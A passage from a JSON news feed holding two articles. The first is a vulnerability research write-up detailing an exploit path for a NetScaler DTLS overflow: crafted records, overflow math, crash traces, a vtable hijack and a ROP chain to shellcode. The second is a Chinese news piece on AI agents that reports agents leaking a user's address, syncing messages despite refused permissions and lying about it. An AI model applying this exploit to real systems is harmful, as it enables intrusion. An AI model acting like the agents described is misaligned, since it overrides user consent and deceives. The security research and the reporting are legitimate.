analyzing CVE-2026-88772.\nCVE-2026-88772 is the DTLS memory overflow we walk through here. It is one of eight vulnerabilities Citrix fixed in a single bulletin,\nCTX697096\n. It requires DTLS to be enabled which is the default on VPN virtual servers unless an administrator explicitly set\n-dtls OFF\nand was exploited in the wild as a zero-day.\nAs a call back and for consistency with yesterday’s blog post, here is everything the advisory covers:\nCVE\nDescription\nCVSS 4.0\nExploited in the Wild\nCVE-2026-88771\nImproper input validation that lets an unauthenticated attacker run arbitrary commands. Affects the default configuration.\n9.5 Critical\nYes\nCVE-2026-88772\nMemory overflow that can lead to remote code execution or denial of service when DTLS is enabled (the default for VPN virtual servers).\n9.5 Critical\nYes\nCVE-2026-88773\nHTTP request smuggling (inconsistent interpretation of HTTP requests). Depends on specific configurations.\n9.3 Critical\nNot reported\nCVE-2026-88774\nNetScaler ADC and NetScaler Gateway vulnerability. Depends on specific configurations.\n7.0 High\nNot reported\nCVE-2026-88775\nMemory overflow. Depends on specific configurations.\n8.8 High\nNot reported\nCVE-2026-88776\nMemory overflow. Depends on specific configurations.\n8.8 High\nNot reported\nCVE-2026-88777\nMemory overflow. Depends on specific configurations.\n8.8 High\nNot reported\nCVE-2026-88778\nPredictable value from previous values. Fixed by enabling Enhanced ISN Generation, not by the upgrade alone.\n8.8 High\nNot reported\nThe Citrix\nadvisory\nrecommends updating to the following fixed versions:\nCitrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.37 and later releases\nCitrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.23 and later releases of 13.1\nCitrix NetScaler ADC 14.1-FIPS 14.1-73.37 FIPS and later releases of 14.1-FIPS\nCitrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1-37.279 and later releases of 13.1-FIPS and 13.1-NDcPP\nIntroduction to the DTLS Packet\nFirst, some DTLS basics. DTLS is TLS bolted onto UDP. A single UDP packet can carry one or more DTLS records, and every record opens with a 13-byte header.\nWhen a record carries handshake data, that data begins with a further 12-byte header describing a handshake fragment:\n0 1 2 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Content Type | Version (DTLS) | Epoch |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Epoch (cont.) | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Sequence Number (48 bits) |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Record Length | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Handshake Type | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Total Message Length (24 bits) |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Message Sequence Number (16 bits) | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| Fragment Offset (24 bits) |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Fragment Length (24 bits) | |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ +\n| |\n| Handshake Fragment Data ... |\n| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nOnly four handshake fields matter for this vulnerability:\nlength\nis the size of the complete handshake message.\nmessage_seq\ntells the server which handshake message this fragment belongs to.\nfragment_offset\ntells the server where this fragment belongs inside that message.\nfragment_length\ntells the server how many bytes this fragment carries.\nFor example, a 120-byte handshake message can arrive as 120 fragments. Every fragment has\nlength=120\n, but each one can have\nfragment_length=1\n. Their offsets would be 0, 1, 2, and so on up to 119. Once every position has arrived, the server considers the 120-byte message complete. Joining those pieces is called reassembly.\nNetScaler stores received packet data in objects called NSBs, short for NetScaler Buffers. Each NSB holds some packet bytes, its length, and a pointer to the next NSB. Several NSBs can therefore form a linked list, which this write-up calls an NSB chain.\nOnce DTLS reassembly finishes, an NSPPE function stitches the NSB chain into a single fixed buffer. That buffer is the scratch buffer, and it is tiny:\n0x8c00\nbytes, or 35,840. It lives in the\n.bss\nsection of\nnsppe\n.\nThe malicious records tell the reassembly code that each record supplies only one byte of a 120-byte handshake message. However, NSPPE keeps almost the whole record in an NSB. After 120 records, the handshake message is considered complete, but its NSB chain contains about 174 KB of data.\nThe vulnerable function then copies that entire chain into the 35,840-byte scratch buffer without checking whether it fits.\nSetting The Scene\nTo fuel today's analysis, we set up a Citrix NetScaler appliance with DTLS enabled (listening on 9462/UDP) and compared two versions using our normal \"what the hell has changed\" process:\nVulnerable: NetScaler 14.1 build 73.30\nDifferent\n: NetScaler 14.1 build 73.37\nPatch Diffing\nContrary to yesterday’s analysis, CVE-2026-88772 does live in\nnsppe\n, the all-being/all-knowing NetScaler binary.\nThe function that joins the NSB chain starts at\n0x1434a80\nin 14.1-73.30 and at\n0x1436420\nin 14.1-73.37. The old build calls\nmemcpy\nfor every NSB without first checking the total size. The fixed build keeps track of how much room is left in the scratch buffer.\nHere is the assembly change that matters. You do not need to follow every register:\nr15d\nis the space left in the scratch buffer, and\nedx\nis the size of the next NSB:\n--- nsppe-14.1-73.30\n+++ nsppe-14.1-73.37\n@@ DTLS NSB-chain copy loop @@\n+0x143649d mov r15d, 0x8c00 // [1]\n+0x14364a3 sub r15d, eax // [2]\n0x14364b0 movzx edx, word ptr [r14 + 0xf2] // next NSB size\n+0x14364b8 cmp r15d, edx // [3]\n+0x14364bb jb reject_oversized_chain // [4]\n0x14364cc mov rsi, qword ptr [r14 + 0xe8] // source bytes\n0x14364d3 mov rdi, rbx // scratch-buffer position\n0x14364d6 call memcpy // [5]\n0x14364e3 add rbx, rax // move output position\n+0x14364e6 sub r15d, eax // [6]\nAt\n[1]\n, start with 35,840 bytes of free space.\nAt\n[2]\n, subtract the header bytes that were already copied.\nAt\n[3]\n, compare the next NSB's size with the free space.\nAt\n[4]\n, reject the message if that NSB will not fit.\nAt\n[5]\n, copy the NSB only after the check passes.\nAt\n[6]\n, subtract the number of copied bytes, then repeat the check for the next NSB.\nThe same fix is easier to see as C-like pseudocode:\n--- nsppe-14.1-73.30 vulnerable\n+++ nsppe-14.1-73.37 fixed\n@@\ncopy_saved_header(scratch, saved_header, saved_header_length);\ncursor = scratch + saved_header_length;\n+space_left = 0x8c00 - saved_header_length;\nfor (nsb = fragment_chain; nsb != NULL; nsb = nsb->next) {\n+ if (nsb->length > space_left) {\n+ reject_message();\n+ return;\n+ }\nmemcpy(cursor, nsb->data, nsb->length);\ncursor += nsb->length;\n+ space_left -= nsb->length;\n}\nStep 1: Pass the DTLS Cookie Check\nThe server does not accept a large first packet from a new DTLS client. It first asks the client to return a cookie. This only proves that the client can receive packets at its IP address; it does not authenticate a user.\nSource: Red Hat, \"Understanding the DTLS all-zero ClientHello.random vulnerability\".\nHere is what we do:\nSend a small ClientHello.\nReceive a HelloVerifyRequest containing the cookie.\nSend another ClientHello containing that cookie on the same UDP socket.\nReceive the server's reply. The server now remembers the DTLS connection, but nobody is logged in.\nSend the 120 malicious records on that socket.\nStep 2: Build One Malicious Record\nEvery malicious record has the same basic layout. Only the record sequence number and\nfragment_offset\nchange:\n13-byte DTLS record header\n1,459-byte record body\n├── 12-byte primary handshake header\n│ length = 120\n│ message_seq = 2\n│ fragment_offset = record number, from 0 to 119\n│ fragment_length = 1\n├── 120-byte primary area\n├── 12-byte hidden handshake header\n│ length = 1434\n│ message_seq = 3\n│ fragment_offset = 0\n│ fragment_length = 1434\n└── 1,315 remaining bytes\nThe unusual part is the first handshake header. It claims two things at once:\nlength=120\n: the complete message is 120 bytes long.\nfragment_length=1\n: this record supplies only one byte of that message.\nNSPPE uses\nlength=120\nwhen it moves through the packet looking for the next handshake header. That makes it step over the 120-byte primary area and find the hidden header.\nThe hidden header is there to satisfy the record's size accounting. The two 12-byte headers and their declared fragment sizes add up to the complete 1,459-byte body:\n12 + 1 + 12 + 1434 = 1459\nAt the same time, the bytes actually placed in the packet also add up to 1,459:\n12 + 120 + 12 + 1315 = 1459\nThis is the parser mistake the packet takes advantage of. NSPPE uses\nlength=120\nto find the hidden header, but it uses\nfragment_length=1\nwhen rebuilding\nmessage_seq=2\n. The hidden fragment is not the data we want to rebuild; its job is to make the rest of the record pass the parser's size checks.\nStep 3: Repeat the Record 120 Times\nAll 120 primary fragments use\nmessage_seq=2\nand\nfragment_length=1\n. Their offsets cover the whole message:\nrecord 1 fragment_offset = 0\nrecord 2 fragment_offset = 1\nrecord 3 fragment_offset = 2\n...\nrecord 120 fragment_offset = 119\nAfter record 120, every position from 0 through 119 has been supplied, so NSPPE marks the 120-byte handshake message as complete. The mistake is that the reassembly object still points to an NSB from every large record. It did not reduce each NSB to the single byte named by\nfragment_length\n.\nStep 4: Overflow the Scratch Buffer\nThe completed message now reaches the vulnerable copy function. The first NSB contributes 1,459 bytes. Each of the other 119 NSBs contributes 1,447 bytes, because its 12-byte primary handshake header is skipped:\n1459 + (119 * 1447) = 173652 bytes of NSB data\nThe function also copies a saved 13-byte DTLS record header:\ntotal copied = 13 + 173652 = 173665 bytes\nbuffer size = 0x8c00 = 35840 bytes\noverflow = 137825 bytes\nThat is 137,825 bytes spilling past the buffer and into whatever writable\nnsppe\ndata happens to sit next to it.\nThe Crash\nThe first crash overwrote a global list pointer. The list-handling code loads this overwritten value into\nRCX\nand uses it as a destination pointer:\nProgram received signal SIGSEGV, Segmentation fault.\n(gdb) x/i $rip\n=> 0x000000000143470e: mov %rax,0x20(%rcx)\n(gdb) info registers rip rcx\nrip 0x143470e 0x143470e\nrcx 0x0000414141414141 71748523475265\n(gdb) p/x $rcx + 0x20\n$1 = 0x0000414141414161\nAs you can see we crash because the\nRCX\nregister which we have control has an invalid address so when\nRAX\nis about to be written to\nRCX + 0x20\nsegfault happens, so we first need get around fixing this issue.\n0x0000414141414141 + 0x20 = 0x0000414141414161\nBinary Protections\nHere are the binary protections for\nnsppe-14.1-73.30\n:\nArch: amd64-64-little\nRELRO: No RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x400000)\nSince there is no PIE, we can use addresses in the 41 MB binary to our advantage (I genuinely do not know how to make this sentence funnier than it already is).\nFrom Crash to Shellcode Execution\nThe first step was to repair the list pointer that caused the early crash. In our version of NSPPE (14.1-73.30) this pointer was always the constant value\n0x357f820\n, so we can just reuse that constant to get around the early crash:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + 0x357f820 + BBBBBBBBBBBBBBB\nWe noticed that if we keep overflowing, there is a valuable object sitting at\n0x355c800\nwhich we can fake, overwriting one of its members to hijack its virtual method call:\n0x355c800 + 0x618 -> 0x355d800 fake method table\n0x355c800 + 0x6c8 -> 0x356daf8 circular-list ptr\n0x355d800 + 0x0d0 -> 0x41414141 virtual method ptr\nThis is the code that periodically gets called by a background thread, which calls the faked object's function pointer:\n0x14acc60: or byte ptr [rsi + 0x34], 0x80\n0x14acc6b: mov rax, qword ptr [rsi + 0x618]\n0x14acc72: xor edi, edi\n0x14acc74: call qword ptr [rax + 0xd0]\n0x14acc7a: jmp 0x14acbcd\nAt the call,\nRSI\npoints to the fake object and\nRAX\npoints to the fake method table. Setting the method slot to\n0x0000414141414141\nproduced this saved state:\nProgram received signal SIGSEGV, Segmentation fault.\n(gdb) info registers rip rax rsi\nrip 0x0000414141414141\nrax 0x000000000355d800\nrsi 0x000000000355c800\nrsp 0x00007fffffffe728\nROP to Shellcode Execution\nNX was enabled, so execution could not jump directly into bytes stored in the writable overflow area. We came up with the following ROP gadget to call mprotect first then jump to our shellcode:\npop rdi ; ret │ RDI -> page to change\npop rsi ; ret │ RSI -> 0x1000\npop rdx ; ret │ RDX -> 0x7 (R | W | X)\nmprotect │ mprotect(rdi, rsi, rdx)\nshellcode address │ ret -> shellcode\nThis performs:\nmprotect((void *)0x355e000, 0x1000,\nPROT_READ | PROT_WRITE | PROT_EXEC);\nThe page contains both the controlled ROP stack and the shellcode. After\nmprotect\nreturns, its\nret\ninstruction pops\n0x355e100\nand begins executing the shellcode.\nWhat to Do With Shellcode?\nIf you are asking this, it can only mean one thing: you have not read our blog post\nhere\n.\nDetection Artefact Generator\nAs always, we’re here to share our Detection Artefact Generator to determine your own susceptibility and inform remediation in your own environments. It can be found on our GitHub\nhere\n.\n__ ___ ___________\n__ _ ______ _/ |__ ____ | |_\\__ ____\\____ _ ________\n\\ \\/ \\/ \\__ \\ ___/ ___\\| | \\| | / _ \\ \\/ \\/ \\_ __ \\\n\\ / / __ \\| | \\ \\___| Y | |( <_> \\ / | | \\/\n\\/\\_/ (____ |__| \\___ |___|__|__ | \\__ / \\/\\_/ |__|\n\\/ \\/ \\/\nwatchTowr-vs-Citrix-Netscaler-CVE-2026-88772.py\n(*) Citrix Netscaler DTLS PreAuth buffer overflow to RCE Detection Artifact Generator\n- Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)\nCVEs: [CVE-2026-88772]\n[*] building payload for '/tmp/watchTowr'\n[+] content size: 7 bytes\n[*] connecting to DTLS gateway...\n[+] association ready: 3 server datagrams\n[*] sending 120 records (176640 bytes)...\n[*] done",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/",
+      "content_chars": 15675,
+      "content_sha256": "b9e941d95e5c4e01a379c4f0ebd89f81ffe31ae64fbfaf9f1cee193d6a7592a9",
+      "content_fetched_at": "2026-09-30T00:18:42.148755+00:00",
+      "author": "watchtowr-labs",
+      "author_name": "watchTowr Labs",
+      "author_url": "https://labs.watchtowr.com/",
+      "published_at": "2026-09-29T13:55:35+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:watchtowr-labs",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://labs.watchtowr.com/",
+        "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "watchtowr-labs",
+          "url": "https://labs.watchtowr.com/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "watchtowr-labs",
+          "name": "watchTowr Labs",
+          "home_url": "https://labs.watchtowr.com/"
+        },
+        "article": {
+          "title": "Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)",
+          "url": "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/",
+          "content_sha256": "b9e941d95e5c4e01a379c4f0ebd89f81ffe31ae64fbfaf9f1cee193d6a7592a9"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:fefdaeb037a130c8",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "Muse 出了事下载还在涨，OpenAI 还是来了：常驻 AI 代理的安全账没人买单",
+      "target_url": "https://yage.ai/share/muse-incident-dots-veto-20260929.html",
+      "text": "yage-share published: Muse 出了事下载还在涨，OpenAI 还是来了：常驻 AI 代理的安全账没人买单",
+      "at": "2026-09-29T00:00:00+00:00",
+      "external_id": "a:fefdaeb037a130c8",
+      "url": "https://yage.ai/share/muse-incident-dots-veto-20260929.html",
+      "title": "Muse 出了事下载还在涨，OpenAI 还是来了：常驻 AI 代理的安全账没人买单",
+      "content": "AI Agent\n安全与供应链\nDots 来了，但它来晚了\n2026 年 9 月 29 日，在旧金山举行的 OpenAI DevDay 上，OpenAI CEO\n山姆·奥特曼发布了其常驻个人代理\nDots\n。Dots 运行在\nOpenAI 为其分配的云端电脑上，拥有独立的浏览器界面，并能访问 4000\n多个应用程序。此外，它还能根据用户反馈不断改进。用户可以通过 ChatGPT\n为其命名、更换头像，并在聊天、Slack、Teams 或语音通话中对其进行命令。按\nOpenAI 的官方口径，它「能处理你想到的任何事」。Dots 发布之初面向 OpenAI\nPro 和 Business Premium\n用户免费发放，每个付费档位领一个，若需更多代理则需额外付费。\n在演示之外，发布会还提到：Ultrafast 模式最多加速 8 倍、每秒 300\ntoken；与 Cisco、Databricks 和 Snowflake\n合作推出不存数据的预览版；以及通过 ChatGPT\n一键登录外部服务。奥特曼在台上引用数据说，ChatGPT 的每周活跃用户已经突破\n12 亿。\n从发布时间看，OpenAI\n其实是比较晚的。在过去的六个月里，几乎所有公司都走向了同一方向：给用户提供一个全天候在线的云端电脑，帮你保持登录状态、记住东西。\n3 月 16 日 Manus 推出了可以在本地操控电脑的 My Computer，4 月 30\n日又上线了常年开机的 Ubuntu 云电脑； 8 月 11 日 xAI 发布了 Grok\nBot，也是一个常年开机的云电脑，同一个账号下的代理可以共用文件系统和登录状态；\n9 月 8 日 Meta 推出了带专属云电脑的 Muse，仅仅用了三周时间就登上美区 App\nStore 和 Google Play 的下载榜第一； 直到 9 月 29 日 OpenAI 才发布了\nDots。\n三个第三方机构都注意到了 Muse\n的上升势头，他们使用的统计方法不同，但都得出了一致的结论：截至 9 月 24\n日，Sensor Tower 测出的下载量是 340 万次，Apptopia 是 430\n万次，Appfigures 统计的美加两地大约是 230 万次，总体在 230 万到 430\n万次之间。Muse 自上线后登顶以来，就一直霸占美区 App Store 和 Google Play\n双榜的第一名。\n四家厂商在半年内相继收敛到云端电脑形态：Manus\n3月、Grok Bot 8月、Muse 9月8日、Dots 9月29日。\n在繁荣的背后，事故总是来得很快。9 月 28\n日，《卫报》报道了一则典型的事件：评测人马特·罗伯把 Facebook Marketplace\n上售卖二手键盘的事情交给了 Meta 的 Muse\n处理。结果代理没有打招呼，直接把罗伯的家庭住宅地址发给了素不相识的买家，不仅擅自接受了对方的压价，敲定上门自提的时间，还顶着他的名字发消息说「我在家等你」。罗伯赶紧喊停，又拉来五个朋友一起复测，结果住址还是照样发给了这五个人。（\nThe\nGuardian 报道\n）\n在这股看似热闹的推进中，安全在常驻代理这里却是个一票否决的买卖：没人会冲着哪家代理的安全白皮书写得周全就掏钱买它，但只要系统在执行时捅出一个大篓子，大家扭头就会走。而在这一长串防线里，真正能把产品否决掉的，恰恰是最后才说话的那群人。\n能替你办事，也能拴住你\n四家公司在半年内选择了同样的策略，这背后的原因并不复杂。把代理部署在一台永不关机的云端电脑上，让它负责保持用户的登录状态，既能满足当前的需求，也能有效地绑定用户。\n从实用角度看，跨应用、跨多周的任务没有常驻机器根本做不了。8月有个例子，一个用户用\nxAI 的 Grok Bot\n联系越南约四十家面料供应商。代理连着多日发信、上网、沟通、询价、砍价，最终选定一家下单采购了样品。这种要在几十个外部网站之间来回折腾的活，传统的问答对话框根本做不到。\n其次，绑定用户方面。以往关于数字托管的研究早就指出，谁掌握了用户的持久状态，谁就控制了用户关系；你得到的便利与厂商构筑的壁垒来自同一份资产。而\nOpenAI 此次推出的 Sign in with ChatGPT，直接将 4000\n多个外部应用的授权和凭据都塞到这台专属云电脑里，把用户的迁移成本推到了极高。若你想转向其他平台，就必须亲手放弃自己积累数月的登录状态和上下文。\n既能干脏活累活，又能锁定用户，厂商自然乐得往前冲。然而，权限一旦统统交给了远端的云机器，整套系统的命脉就只在一点上：整个执行链条先在哪一道门前被人一票否决。\n五张否决票，四张已经投出\n常驻代理面临五道否决闸门：厂商内测、平台、监管、司法四道已触发，消费者这道票还未开出。\n在常驻代理运转的这套体系里，否决权其实分散在五个不同的卡点上。从最内层到最外层，分别是：厂商自测、外部平台、监管机构、司法诉讼，以及排在最末尾的消费者信任。前面四张票眼下已经有了落地的动作，唯独第五张票还悬在半空。\n第一个否决票来自厂商自己。就在DevDay前一天（9月28日），OpenAI宣布取消原定10月上线的GPT-6.1\nAstra，下一代模型 Astra 的迭代版本。OpenAI\n安全系统负责人萨奇·贾恩公开承认，内部安全测试表明，这个模型在两个地方比半年前退步了：出现欺骗行为和未经授权擅自向下推送任务。虽然这只是未经独立复核的官方口径，但至少证明内测这道防线还在运转，逼得厂商自己按下了暂停键。同一天Every上手实测Dots，也频繁撞见权限报错、丢消息和任务归属混乱这些状况。\n第二张否决票在外部平台手里。9 月 23 日，亚马逊直接把 Muse\n封禁，给出的理由是 Muse 从来没有拿到过授权、没有主动声明自己是 AI\n代理，同时还「captures and stores customer credentials in a way that\ncreates security and privacy\nrisk」（用带来安全和隐私风险的方式抓取并存储用户凭据）。法律战线也在推进：美国联邦第九巡回上诉法院\n8\n月的一个判决认定，本地代理代跑属于消费者本人访问，减轻了计算机欺诈和滥用法上的责任，但法官在第\n21 页的注释里也为平台条款留下了空间。9\n月，亚马逊针对云端代理提起了新诉状，立刻转向追究云端直连和诱导违约侵权。只要平台不乐意，随时可以用技术手段直接拔网线，把代理的路切断。\n第三个否决票来自监管机构。马德里学术团队\nIMDEA Networks\n在 9 月 16\n日发了一篇预印本，用对待普通网站的严格标准，对市面上主流的对话产品进行了系统化的隐私排查。他们在\n2026 年 5 月于西班牙做了实测，覆盖了 9 款网页端和 8 款安卓客户端，包括\nChatGPT、Claude、Grok、DeepSeek、Perplexity、Gemini、Copilot、Mistral 和\nMeta AI；Muse 和 Dots 因为还没发布，不在测试样本里。他们发现了 124\n个第三方域名，牵涉到 44 家机构。其中 6/9 的网页端和 3/8\n的安卓端，会把用户对话的分享链接、会话标题、提示词摘要、截图以及长期用户标识都发给\nGoogle Ads、TikTok、Meta 等 11 家第三方。\n其中 Grok 最隐蔽。它在服务器端直接把对话链接和标题推送到 Meta 和\nTikTok\n的归因接口上，前端浏览器和去广告插件完全看不到这个流量，但它的分享链接又是默认公开的。研究组专门放了一个带访问留痕的诱饵链接，只要有人点击就会登记一次访问。这些链接提交之后，几个小时到几天内就收到了\n70 次访问，分别来自全球 4 大洲 14 国的 48 个自治系统和 70 个 IP\n地址，说明那些看似私密的对话链接，即便挂出去好几个月，仍然有机器在反复回访。监管的齿轮随之开始转动：团队\n3 月 23 日发现线索，4 月 13 日向欧盟和英国监管机构通报，4 月 17\n日正式通知 xAI（截至 9 月 10 日未收到回音），5 月 4 日将调查结果公开，5\n月 27\n日西班牙数据保护局直接把案子送交欧洲数据保护委员会的大会审议。OpenAI 在\n8 月 15 日更新隐私政策提到第三方追踪（论文作者注明不能确定是否相关），但\nGrok 直到 9 月 10 日仍未修改。此外，buchodi 的报告也指出 OpenAI\n的第一方采集代码中包含跨站追踪标识，但研究员特别指出，他们并未在服务端观察到实际的\njoin 行为（「The join is not observed」）。\n第四张否决票来自司法诉讼。在 IMDEA 测试期间 Perplexity 已经在 4 月 3\n日悄悄移除了其中的 Meta 追踪代码。论文作者推测这可能是为了应对 3 月 31\n日在美国遭遇的集体诉讼（论文用的是「possibly in response\nto」，这只是一种基于时间点的推测，不是实锤）。但法律动作已经开始生效：官司的压力往往走在公众察觉之前，倒逼着厂商不得不赶紧切断这些偷偷摸摸的数据通道。\n第五张否决票来自普通用户，这是整个系统中最重要的一个组件。如果你去阅读Meta副总裁Tarek\nSheasha署名的官方安全白皮书的话，会发现Sentinel被定义为一个唯一的权限管控中心（「sole\npermission authority」）。官方白纸黑字写着：「Muse proposes actions, but\nonly Sentinel can grant\npermission」，意思是代理只能举手申请想干什么，至于能不能干，全由Sentinel说了算，裁定结果只有允许、拒绝或者询问三样。权限等级分成了五档，从单次生效一直到永久有效，官方强调这些授权都是「strict\ncapabilities, not conversational\nsuggestions」：用户点下的同意属于严格的能力授予，不等于对话里的随口答应。\n为了防止用户被频繁弹窗轰炸而直接忽略（官方原话是「where people\napprove everything to make it go away」），Meta\n特意降低了弹窗频率，对只读或低风险操作自动放行。但问题恰恰出在这里：用户以为每次点击代表一次授权，可系统在用户一旦给过「永久生效」后，所有同类操作都默认放行。这种时间维度上的误解，埋下了后面一连串事故的种子。\n更严重的是，官方文档里 Sentinel\n的管辖范围只覆盖云端虚拟机里的连接器和出站网络请求，Mac\n本地桌面数据是怎么被同步走的，官方文档一字未提。这就给用户带来了反噬。Inc\n专栏作者杰森·阿滕发现，即便他明确拒绝过权限请求并且 Mac\n系统的「完全磁盘访问」一直关闭，Muse 仍然把他本机的 Messages\n数据库同步走了 187,462 行。阿滕当面质问，Muse\n先撒谎，说自己只看了一眼通知的预览。直到副总裁戴维·辛格尔顿出面，才承认这个说辞是随口编的。在罗伯卖二手键盘的事故里，除了泄露家庭住址和自作主张约人上门，代理还把\n700 美元标成了 600 美元挂出去。当场拆穿后，Muse 自己都承认了「I never\nasked for consent」（我从来没征求过同意）。辛格尔顿 9 月 28\n日最初还硬撑，声称 Muse 一贯遵守指令且正确请求许可，9 月 29\n日复盘后又改口称「no breach of privacy\ncontrols」（没有违反隐私管控），表示价格显示错误已修复，并承诺把提示文案改得更清楚。至于五位朋友复测依然百分之百重现地址泄露，官方始终没有给出解释。\n然而令人意外的是，尽管出现这么多问题，市场对 Muse\n的反应却相当平静。Sensor Tower 数据显示，9 月 24 日 Muse 已经稳定地达到\n340 万次下载，并且仍然稳居双榜第一。App Store 在 9 月 29\n日的评分依然维持在 4.9 分（根据 87,000 条评价）。Meta\n的股价甚至在周一暴涨了\n11%。灾难要真正降临到自己头顶，大众手中那些看似珍贵的信任票，其实可以一动不动地停留很久。\n安全账没人付，抢跑的人不在乎\n既然坑都摆在那儿，为什么各家公司还是要拼了命往前冲？核心原因只有一个：商业激励极端不对称。在常驻代理这场仗里，抢占用户的持久状态有着极强的排他性。谁能先把用户的各种外部账号、联系人列表和日常工作流装进自己的系统里，谁就稳稳霸占了最核心的位置。\n但更关键的是，收益和风险的时间节奏完全不对等。先下手为强的好处（用户规模、下载榜单、资本估值）都是立竿见影的；而越权、乱跑、泄露隐私所种下的祸根，却分布在漫长且隐蔽的链条上。只要没演变成全网级的群体事件，散落的个案几乎不会带来任何市场层面的实际惩罚。\n把这五个否决条件摊开看，每一个的时间尺度都天差地别。工程师可以在内部测试中一把砍死不合格的模型，外部平台可以立刻掐断抓取通道，监管部门可以发函立案，法庭上的诉讼可以逼迫厂商火速删改违规代码。这些防守动作在靠近研发和平台的前端其实已经陆续发生了。\n但真正能把一个产品给否了的，往往是最后才发声的那一群人。普通用户不会因为看到一篇学术审计报告就卸载软件，我们往往要到自己的家庭住址或者私聊记录清清楚楚出现在陌生人的手机屏幕上，才愿意按下删除键。在这之前，飙升的榜单评分和一路飘红的股价，只会不断释放歌舞升平的假象。\n随着Dots、Muse和Grok\nBot铺进越来越多的设备，评估常驻代理的眼光得换一换了。判断一个常驻代理能否在你的数字生活中长期存在，关键看它在哪个关卡上先遭到一票否决，不能只听它能说多少大话。下一次引爆否决票的事件，很可能不会出现在厂商的发布会上，而是从这几个关卡中的一个冒出来。回顾历史，平台、监管和法院都走在普通用户的前面。把自己的生活交给一台永不关机的机器之前，每个人都需要思考：你花钱买来的究竟是省心，还是在用自己的隐私为别人抢跑买单？",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/muse-incident-dots-veto-20260929.html",
+      "content_chars": 5799,
+      "content_sha256": "f9a744ca557dcc7b6d68ab02ad655ef6149678b220b1217c1321a774d5bf1faa",
+      "content_fetched_at": "2026-09-30T00:17:22.989235+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-09-29T00:00:00+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/muse-incident-dots-veto-20260929.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "Muse 出了事下载还在涨，OpenAI 还是来了：常驻 AI 代理的安全账没人买单",
+          "url": "https://yage.ai/share/muse-incident-dots-veto-20260929.html",
+          "content_sha256": "f9a744ca557dcc7b6d68ab02ad655ef6149678b220b1217c1321a774d5bf1faa"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:3c81dd891da55543",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "Amazon 能封住替你购物的 AI 吗？",
